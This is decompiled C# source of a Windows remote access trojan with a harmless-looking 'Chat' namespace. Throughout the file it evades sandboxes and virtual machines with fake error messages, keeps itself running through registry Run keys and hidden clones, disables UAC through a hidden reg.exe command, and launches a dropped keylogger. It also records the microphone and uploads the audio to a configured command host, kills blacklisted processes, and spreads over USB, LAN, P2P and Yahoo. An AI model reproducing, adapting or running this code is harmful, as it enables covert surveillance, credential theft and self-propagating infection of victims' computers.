namespace Chat
{
    using Chat.My;
    using Chat.My.Resources;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Security.Principal;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Form1 : Form
    {
        private static List<WeakReference> __ENCList = new List<WeakReference>();
        [AccessedThroughProperty("pe")]
        private Persistance _pe;
        [AccessedThroughProperty("Timer1")]
        private Timer _Timer1;
        [AccessedThroughProperty("Timer2")]
        private Timer _Timer2;
        private bool Autorun;
        private bool Clone;
        public string CloneName;
        private IContainer components;
        public string cpu;
        private string Filez;
        private string GUID;
        private bool HideClone;
        private bool Hidex;
        public bool IsAdmin;
        private bool LAN;
        public Mutex M;
        public Mutex M2;
        private string NameFristKey;
        private string NameSecondKey;
        private bool P2P;
        private bool recording;
        private string RunOnce;
        public string saveClone;
        private long SimpleAntiExample;
        private const int SWP_HIDEWINDOW = 0x80;
        private const int SWP_SHOWWINDOW = 0x40;
        private bool USB;
        private bool Yahoo;

        public Form1()
        {
            base.Load += new EventHandler(this.Form1_Load);
            __ENCAddToList(this);
            this.recording = false;
            this.Filez = MyProject.Computer.FileSystem.SpecialDirectories.MyMusic.ToString() + @"\rec.winz";
            this.Autorun = false;
            this.RunOnce = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            this.Clone = false;
            this.Hidex = false;
            this.HideClone = false;
            this.pe = new Persistance();
            this.GUID = "{F36PS-ODHA-SDUHGS-AYDGWD-GSAD}";
            this.InitializeComponent();
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            List<WeakReference> list = __ENCList;
            lock (list)
            {
                if (__ENCList.Count == __ENCList.Capacity)
                {
                    int index = 0;
                    int num3 = __ENCList.Count - 1;
                    for (int i = 0; i <= num3; i++)
                    {
                        WeakReference reference = __ENCList[i];
                        if (reference.IsAlive)
                        {
                            if (i != index)
                            {
                                __ENCList[index] = __ENCList[i];
                            }
                            index++;
                        }
                    }
                    __ENCList.RemoveRange(index, __ENCList.Count - index);
                    __ENCList.Capacity = __ENCList.Count;
                }
                __ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
            }
        }

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__1(object a0)
        {
            Socketss.Connect(Conversions.ToString(a0));
        }

        private void _Mic()
        {
            if (!this.recording)
            {
                mciSendString("open new Type waveaudio Alias recsound", "", 0, IntPtr.Zero);
                mciSendString("record recsound", "", 0, IntPtr.Zero);
                this.recording = true;
            }
            else
            {
                mciSendString("save recsound " + this.Filez, "", 0, IntPtr.Zero);
                mciSendString("close recsound ", "", 0, IntPtr.Zero);
                this.recording = false;
            }
        }

        private bool antiSandboxie()
        {
            if (Process.GetProcessesByName("SbieSvc").Length >= 1)
            {
                string lpClassName = "SandboxieControlWndClass";
                string lpWindowName = null;
                int num = (int) FindWindow(ref lpClassName, ref lpWindowName);
                if (num == 0)
                {
                    return true;
                }
            }
            return false;
        }

        public void AutoRunKey()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(this.RunOnce, true);
            key.SetValue(this.NameFristKey, Application.ExecutablePath, RegistryValueKind.String);
            if (this.Clone)
            {
                try
                {
                    MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.saveClone + @"\" + this.CloneName, true);
                    if (this.HideClone)
                    {
                        this.Invisble(this.saveClone + this.CloneName);
                    }
                    key.SetValue(this.NameSecondKey, this.saveClone + @"\" + this.CloneName, RegistryValueKind.String);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
            }
            if (this.Hidex)
            {
                this.Invisble(Application.ExecutablePath);
            }
        }

        private void BindingSource1_CurrentChanged(object sender, EventArgs e)
        {
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        public void BuildSetting()
        {
            string legalTrademarks = FileVersionInfo.GetVersionInfo(Application.ExecutablePath).LegalTrademarks;
            string strCode = "ctOSMoney";
            string[] strArray = Strings.Split(this.DecryptAES(legalTrademarks, strCode), "|E|", -1, CompareMethod.Binary);
            if (Conversions.ToBoolean(strArray[0x21]))
            {
                Thread.Sleep((int) (Conversions.ToInteger(strArray[0x22]) * 0x3e8));
            }
            if (Conversions.ToBoolean(strArray[12]) && this.antiSandboxie())
            {
                Interaction.MsgBox("Fatal error", MsgBoxStyle.Critical, "Sandboxie Control");
                Process.GetCurrentProcess().Kill();
            }
            if (Conversions.ToBoolean(strArray[13]) && this.CheckAvastSandBox())
            {
                Interaction.MsgBox("Fatal error 0x00906", MsgBoxStyle.Critical, "Avast");
                Process.GetCurrentProcess().Kill();
            }
            if (Conversions.ToBoolean(strArray[14]) && this.VBOX())
            {
                Interaction.MsgBox("This application is not configurate to work in this area", MsgBoxStyle.Critical, "Error 0x0004");
                Process.GetCurrentProcess().Kill();
            }
            if (Conversions.ToBoolean(strArray[15]) && this.VMW())
            {
                Interaction.MsgBox("This application is not configurate to work in this area", MsgBoxStyle.Critical, "Error 0x0004");
                Process.GetCurrentProcess().Kill();
            }
            if (Conversions.ToBoolean(strArray[0x10]))
            {
                string lpModuleName = "Karnel32.dll";
                if (GetProcAddress((IntPtr) GetModuleHandle(ref lpModuleName), "wine_get_unix_file_name") != IntPtr.Zero)
                {
                    Interaction.MsgBox("This application is not configurate to work in this area", MsgBoxStyle.Critical, "Error 0x0004");
                    Process.GetCurrentProcess().Kill();
                }
            }
            if (Conversions.ToBoolean(strArray[0x11]) && this.QUEMU())
            {
                Interaction.MsgBox("This application is not configurate to work in this area", MsgBoxStyle.Critical, "Error 0x0004");
                Process.GetCurrentProcess().Kill();
            }
            if ((!this.IsElevatedProcess() && Conversions.ToBoolean(strArray[0x1a])) && !this.IsElevatedProcess())
            {
                this.RestartElevated();
            }
            if (Conversions.ToBoolean(strArray[30]))
            {
                if (MutexCheck(strArray[0x1f]))
                {
                    ProjectData.EndApp();
                }
                else
                {
                    this.SetMutex(strArray[0x1f]);
                }
            }
            if (!((WindowsPrincipal) Thread.CurrentPrincipal).IsInRole(WindowsBuiltInRole.Administrator) && Conversions.ToBoolean(strArray[10]))
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                Process process = new Process();
                ProcessStartInfo info3 = startInfo;
                info3.UseShellExecute = true;
                info3.FileName = Application.ExecutablePath;
                info3.WindowStyle = ProcessWindowStyle.Hidden;
                info3.Verb = "runas";
                info3 = null;
                process = Process.Start(startInfo);
                Process.GetCurrentProcess().Kill();
            }
            Socketss.host = strArray[0];
            Socketss.port = Conversions.ToInteger(strArray[1]);
            Socketss.ServerName = strArray[2];
            this.Autorun = Conversions.ToBoolean(strArray[3]);
            this.NameFristKey = strArray[4];
            this.Hidex = Conversions.ToBoolean(strArray[5]);
            this.Clone = Conversions.ToBoolean(strArray[6]);
            this.NameSecondKey = strArray[7];
            this.CloneName = strArray[8];
            this.HideClone = true;
            string str4 = strArray[11];
            if (str4 == "ProgramFiles")
            {
                this.saveClone = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles.ToString() + @"\";
            }
            else if (str4 == "MyDocuments")
            {
                this.saveClone = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments.ToString() + @"\";
            }
            else if (str4 == "Cookies")
            {
                this.saveClone = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + @"\";
            }
            else if (str4 == "Temp")
            {
                this.saveClone = MyProject.Computer.FileSystem.SpecialDirectories.Temp;
            }
            else if (str4 == "Roaming")
            {
                this.saveClone = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
            }
            else
            {
                this.saveClone = strArray[11];
            }
            if (this.Autorun)
            {
                this.AutoRunKey();
                this.Timer1.Start();
            }
            this.USB = Conversions.ToBoolean(strArray[0x12]);
            this.LAN = Conversions.ToBoolean(strArray[0x13]);
            this.P2P = Conversions.ToBoolean(strArray[20]);
            this.Yahoo = Conversions.ToBoolean(strArray[0x15]);
            if (Conversions.ToBoolean(strArray[0x16]) && !this.pe.IsWatcher)
            {
                this.pe.Start();
                Funzioni.ProtectProcess();
            }
            if (Conversions.ToBoolean(strArray[0x18]))
            {
                Funzioni.AntiDebug();
            }
            if (Conversions.ToBoolean(strArray[0x19]))
            {
                Funzioni.AntiDllInjection();
            }
            if (Conversions.ToBoolean(strArray[0x1b]))
            {
                if (!this.IsElevatedProcess())
                {
                    this.RestartElevated();
                }
                else
                {
                    Interaction.Shell(@"C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide, false, -1);
                }
            }
            if (Conversions.ToBoolean(strArray[0x1c]))
            {
                Funzioni.DisableZonechecks();
            }
            if (Conversions.ToBoolean(strArray[0x20]))
            {
                Hide_Process_From_TaskManager.Running = true;
            }
            if (Conversions.ToBoolean(strArray[0x1d]))
            {
                Funzioni.UnkillableProcessExploit();
            }
            Funzioni.BlueScreenOnTermination(Conversions.ToBoolean(strArray[0x17]));
            this.Timer2.Start();
        }

        private bool CheckAvastSandBox()
        {
            string lpModuleName = "snxhk.dll";
            this.SimpleAntiExample = GetModuleHandle(ref lpModuleName);
            return (this.SimpleAntiExample > 0L);
        }

        private string DecryptAES(string strInput, string strCode)
        {
            RijndaelManaged managed = new RijndaelManaged();
            MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
            byte[] destinationArray = new byte[0x20];
            byte[] sourceArray = provider.ComputeHash(Encoding.UTF8.GetBytes(strCode));
            Array.Copy(sourceArray, 0, destinationArray, 0, 0x10);
            Array.Copy(sourceArray, 0, destinationArray, 15, 0x10);
            managed.BlockSize = 0x80;
            managed.KeySize = 0x100;
            managed.Padding = PaddingMode.PKCS7;
            managed.Key = destinationArray;
            managed.Mode = CipherMode.ECB;
            ICryptoTransform transform = managed.CreateDecryptor();
            byte[] inputBuffer = Convert.FromBase64String(strInput);
            return Encoding.UTF8.GetString(transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        }

        public void DeletKey()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(this.RunOnce, true);
            try
            {
                key.DeleteValue(this.NameFristKey);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            try
            {
                key.DeleteValue(this.NameSecondKey);
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.components != null))
                {
                    this.components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DllImport("user32", EntryPoint="FindWindowA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);
        [DllImport("user32", EntryPoint="FindWindowExA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long FindWindowEx(long hWnd1, long hWnd2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);
        public void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                if (!MyProject.Computer.FileSystem.FileExists(SplitFunzioni.ProtectionFiles))
                {
                    MyProject.Computer.FileSystem.WriteAllText(SplitFunzioni.ProtectionFiles, "", true);
                }
                this.IsAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
                this.Visible = false;
                this.ShowInTaskbar = false;
                try
                {
                    MyProject.Computer.FileSystem.WriteAllBytes(SplitFunzioni.KeyloggherExePatch, Chat.My.Resources.Resources.Autorestart, false);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    File.Delete(SplitFunzioni.KeyloggherDatPatch);
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                File.WriteAllText(SplitFunzioni.KeyloggherDatPatch, "1");
                bool flag = true;
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName.ToString() == "usersdat")
                    {
                        flag = false;
                        break;
                    }
                }
                if (flag)
                {
                    try
                    {
                        Process.Start(SplitFunzioni.KeyloggherExePatch);
                    }
                    catch (Exception exception3)
                    {
                        ProjectData.SetProjectError(exception3);
                        ProjectData.ClearProjectError();
                    }
                }
                this.BuildSetting();
                this.cpu = Funzioni.GetCPU();
                Thread thread = new Thread(new ParameterizedThreadStart(Form1._Lambda$__1));
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start(this.cpu);
                SplitFunzioni.MineForm = this;
                if (MyProject.Computer.FileSystem.FileExists(SplitFunzioni.BlakListPath))
                {
                    SplitFunzioni.BlakListFind = MyProject.Computer.FileSystem.ReadAllText(SplitFunzioni.BlakListPath);
                }
                Thread thread2 = new Thread(new ThreadStart(this.ProcessKill));
                thread2.SetApartmentState(ApartmentState.STA);
                thread2.IsBackground = false;
                thread2.Start();
                SplitFunzioni.ListProtect = MyProject.Computer.FileSystem.ReadAllText(SplitFunzioni.ProtectionFiles);
                string[] strArray = Strings.Split(SplitFunzioni.ListProtect, "\r\n", -1, CompareMethod.Binary);
                int num3 = strArray.Length - 2;
                for (int i = 0; i <= num3; i++)
                {
                    ProtectionSettings settings = new ProtectionSettings();
                    string[] strArray2 = strArray[i].ToString().Split(new char[] { '|' });
                    settings.ElevateAdmin = Conversions.ToBoolean(strArray2[0]);
                    settings.HideProcess = Conversions.ToBoolean(strArray2[1]);
                    settings.HideFile = Conversions.ToBoolean(strArray2[2]);
                    settings.ExecutionDelay = Conversions.ToBoolean(strArray2[3]);
                    settings.ExecutionDelayTime = Conversions.ToInteger(strArray2[4]);
                    settings.StartUP = Conversions.ToBoolean(strArray2[5]);
                    string patch = strArray2[6];
                    new FileProtector(settings).Start(patch, true);
                }
                if (this.Autorun)
                {
                    this.AutoRunKey();
                }
                this.Timer1.Start();
            }
            catch (Exception exception4)
            {
                ProjectData.SetProjectError(exception4);
                Process.GetCurrentProcess().Kill();
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern uint GetFileAttributes(string lpFileName);
        [DllImport("kernel32", EntryPoint="GetModuleHandleA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        public void HideTaskBar()
        {
            string lpClassName = "Shell_traywnd";
            string lpWindowName = "";
            long hwnd = FindWindow(ref lpClassName, ref lpWindowName);
            if (hwnd > 0L)
            {
                hwnd = SetWindowPos(hwnd, 0L, 0L, 0L, 0L, 0L, 0x80L);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.components = new Container();
            this.Timer1 = new Timer(this.components);
            this.Timer2 = new Timer(this.components);
            this.SuspendLayout();
            this.Timer1.Interval = 0x2710;
            this.Timer2.Interval = 0x3e8;
            SizeF ef2 = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef2;
            this.AutoScaleMode = AutoScaleMode.Font;
            Size size2 = new Size(0x11c, 0x106);
            this.ClientSize = size2;
            this.Name = "Form1";
            this.Text = "Form1";
            this.ResumeLayout(false);
        }

        public void Invisble(string patch)
        {
            FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(patch);
            fileInfo.IsReadOnly = true;
            fileInfo.Attributes |= FileAttributes.Hidden;
        }

        private bool IsElevatedProcess()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        [DllImport("winmm.dll")]
        private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
        public static bool MutexCheck(string MutexString)
        {
            bool flag;
            try
            {
                Mutex mutex = new Mutex(false, MutexString);
                if (!mutex.WaitOne(0, false))
                {
                    mutex.Close();
                    return true;
                }
                flag = false;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                flag = false;
                ProjectData.ClearProjectError();
                return flag;
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        public void ProcessKill()
        {
            while (true)
            {
                while (SplitFunzioni.BlakListFind == null)
                {
                }
                string[] strArray = Strings.Split(SplitFunzioni.BlakListFind, "\r\n", -1, CompareMethod.Binary);
                foreach (Process process in Process.GetProcesses())
                {
                    int num3 = strArray.Length - 2;
                    for (int i = 0; i <= num3; i++)
                    {
                        if (strArray[i].Contains("|W|Y"))
                        {
                            string str = strArray[i].Replace("|W|Y", "");
                            if (process.ProcessName == str)
                            {
                                process.Kill();
                            }
                        }
                    }
                }
                Thread.Sleep(0x3e8);
            }
        }

        private bool QUEMU()
        {
            return (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "QEMU" }, null, null, null)) || Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\Description\\System", "SystemBiosVersion"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "QEMU" }, null, null, null)));
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        internal void RestartElevated()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.UseShellExecute = true;
            startInfo.WorkingDirectory = Environment.CurrentDirectory;
            startInfo.FileName = Application.ExecutablePath;
            startInfo.Verb = "runas";
            try
            {
                Process process = Process.Start(startInfo);
            }
            catch (Win32Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Win32Exception exception = exception1;
                ProjectData.ClearProjectError();
                return;
                ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
        }

        private void SaveRights()
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.CreateNoWindow = true;
            info.FileName = "cmd";
            info.Arguments = "/C schtasks /Create /F /TN \"" + this.GUID + "\" /SC ONCE /ST 00:00 /TR \"'cmd.exe' /C start \"\" \"" + Application.ExecutablePath + "\" /RL Highest";
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.UseShellExecute = false;
            Process process = new Process();
            process.StartInfo = info;
            process.Start();
            process.WaitForExit();
        }

        public void SendRecord()
        {
        Label_0002:
            if (File.Exists(this.Filez))
            {
                Socketss.listDataSendWebcam.Add(new Data("Phone", null, File.ReadAllBytes(this.Filez)));
                File.Delete(this.Filez);
            }
            else
            {
                goto Label_0002;
            }
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private void SetMutex(string mutex)
        {
            this.M = new Mutex(false, mutex);
            if (!this.M.WaitOne(0, false))
            {
                this.M.Close();
                this.M = null;
                if (Environment.GetCommandLineArgs().Length < 2)
                {
                    ProjectData.EndApp();
                }
            }
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long SetWindowPos(long hwnd, long hWndInsertAfter, long x, long y, long cx, long cy, long wFlags);
        public void ShowTaskBar()
        {
            string lpClassName = "Shell_traywnd";
            string lpWindowName = "";
            long hwnd = FindWindow(ref lpClassName, ref lpWindowName);
            if (hwnd > 0L)
            {
                hwnd = SetWindowPos(hwnd, 0L, 0L, 0L, 0L, 0L, 0x40L);
            }
        }

        public void StartStopRec()
        {
            Mic method = new Mic(this._Mic);
            this.Invoke(method);
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (this.Autorun)
            {
                this.AutoRunKey();
            }
            MyProject.Computer.FileSystem.WriteAllText(SplitFunzioni.ProtectionFiles, SplitFunzioni.ListProtect, false);
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            if (this.USB)
            {
                Spread.USBSpread();
            }
            if (this.LAN)
            {
                Spread.LanSpread();
            }
            if (this.P2P)
            {
                Spread.P2PSpread(Conversions.ToString(MyProject.Computer.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\LimeWire\", "Shared", 0)));
            }
            if (this.Yahoo)
            {
                Spread.YahooSpread();
            }
        }

        public void UacBaypass()
        {
            if (!this.IsAdmin && File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\Tasks\" + this.GUID))
            {
                Process process = new Process();
                ProcessStartInfo info = new ProcessStartInfo();
                info.CreateNoWindow = true;
                info.WindowStyle = ProcessWindowStyle.Hidden;
                info.FileName = "cmd";
                info.Arguments = "/C schtasks /Run /TN \"" + this.GUID + "";
                process.StartInfo = info;
                process.Start();
                Environment.Exit(1);
            }
        }

        private bool VBOX()
        {
            return (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VBOX" }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\Description\\System", "SystemBiosVersion"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VBOX" }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\Description\\System", "VideoBiosVersion"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VIRTUALBOX" }, null, null, null)) || Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.LocalMachine.GetValue(@"SOFTWARE\\Oracle\\VirtualBox Guest Additions", ""), "noValueButYesKey", false))));
        }

        private bool VMW()
        {
            return (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VMWARE" }, null, null, null)) || (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.LocalMachine.GetValue(@"SOFTWARE\\VMware, Inc.\\VMware Tools", ""), "noValueButYesKey", false) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VMWARE" }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VMWARE" }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "vmware".ToUpper() }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VMWARE" }, null, null, null)) || (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { "VMWARE" }, null, null, null)) || Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(MyProject.Computer.Registry.LocalMachine.GetValue(@"SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath"), null, "ToUpper", new object[0], null, null, null), null, "Contains", new object[] { @"C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\" }, null, null, null)))))))));
        }

        private Persistance pe
        {
            [DebuggerNonUserCode]
            get
            {
                return this._pe;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                this._pe = value;
            }
        }

        internal virtual Timer Timer1
        {
            [DebuggerNonUserCode]
            get
            {
                return this._Timer1;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                EventHandler handler = new EventHandler(this.Timer1_Tick);
                if (this._Timer1 != null)
                {
                    this._Timer1.Tick -= handler;
                }
                this._Timer1 = value;
                if (this._Timer1 != null)
                {
                    this._Timer1.Tick += handler;
                }
            }
        }

        internal virtual Timer Timer2
        {
            [DebuggerNonUserCode]
            get
            {
                return this._Timer2;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                EventHandler handler = new EventHandler(this.Timer2_Tick);
                if (this._Timer2 != null)
                {
                    this._Timer2.Tick -= handler;
                }
                this._Timer2 = value;
                if (this._Timer2 != null)
                {
                    this._Timer2.Tick += handler;
                }
            }
        }

        public delegate void Mic();
    }
}

